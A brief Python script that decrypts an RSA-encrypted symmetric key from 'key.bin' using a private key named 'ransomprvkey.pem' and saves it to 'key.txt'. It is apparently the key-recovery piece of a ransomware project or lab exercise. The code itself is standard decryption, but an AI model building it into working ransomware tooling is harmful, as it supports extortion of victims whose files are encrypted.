from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# DECRYPT SYMMETRIC KEY
file_in = open("key.bin", "rb")
private_key = RSA.import_key(open("ransomprvkey.pem").read())
enc_key = file_in.read(private_key.size_in_bytes())
cipher_rsa = PKCS1_OAEP.new(private_key)
symkey = cipher_rsa.decrypt(enc_key)

# write symkey to txt file
fout = open("key.txt", "wb")
fout.write(symkey)
fout.close()

file_in.close()